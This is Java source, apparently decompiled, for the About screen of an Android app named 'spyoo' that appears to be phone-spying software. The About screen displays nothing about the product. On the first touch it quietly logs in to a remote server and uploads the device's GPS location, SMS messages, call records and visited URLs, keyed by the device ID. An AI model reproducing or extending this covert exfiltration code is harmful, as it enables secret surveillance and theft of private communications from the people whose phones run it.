package iits.spyoo;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.widget.TextView;
import iits.code.bus.Account_BUS;
import iits.code.bus.Setting_BUS;
import iits.code.dto.Account_DTO;
import iits.code.dto.Setting_DTO;
import iits.common.Constants;
import iits.mamager.CallManager;
import iits.mamager.FileManager;
import iits.mamager.GPSManager;
import iits.mamager.LoginManager;
import iits.mamager.SMSManager;
import iits.mamager.URLManager;
import org.apache.http.HttpResponse;

public class About extends Activity implements View.OnTouchListener {
    private static final String TAG = "About";
    private boolean flag;
    private TextView txvTouch;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.about);
        this.txvTouch = (TextView) findViewById(R.id.txvTouch);
        this.txvTouch.setOnTouchListener(this);
        this.flag = true;
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        super.onKeyDown(keyCode, event);
        Intent i = new Intent(this, Login.class);
        i.setFlags(268435456);
        startActivity(i);
        finish();
        return false;
    }

    public boolean onTouch(View v, MotionEvent event) {
        if (this.flag) {
            SendDataToWebSite();
            this.flag = false;
        }
        return false;
    }

    private void SendDataToWebSite() {
        try {
            FileManager.WriteLog(1, TAG, "Send data from About");
            Context mContext = getApplicationContext();
            Setting_DTO setting = Setting_BUS.get(mContext);
            Account_DTO account = Account_BUS.get(mContext);
            String deviceID = ((TelephonyManager) getSystemService("phone")).getDeviceId();
            String link = setting.getLink();
            FileManager.WriteLog(1, TAG, "check account");
            if (!account.getUsername().equals("") && !account.getPassword().equals("")) {
                HttpResponse response = LoginManager.login(mContext, String.valueOf(link) + Constants.URL_LOGIN, "", "", "");
                FileManager.WriteLog(1, TAG, "check internet ");
                if (response != null) {
                    FileManager.WriteLog(1, TAG, "send gps");
                    GPSManager.sendDataOfGPSToWebsite(mContext, String.valueOf(link) + Constants.URL_GPS, deviceID);
                    FileManager.WriteLog(1, TAG, "send sms");
                    SMSManager.sendDataOfSMSToWebsite(mContext, String.valueOf(link) + Constants.URL_SMS, deviceID);
                    FileManager.WriteLog(1, TAG, "send call");
                    CallManager.sendDataOfCallToWebsite(mContext, String.valueOf(link) + Constants.URL_CALL, deviceID);
                    FileManager.WriteLog(1, TAG, "send url");
                    URLManager.sendDataOfURLToWebsite(mContext, String.valueOf(link) + Constants.URL_URL, deviceID);
                }
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on SendDataToWebSite function: " + e.toString());
        }
    }
}
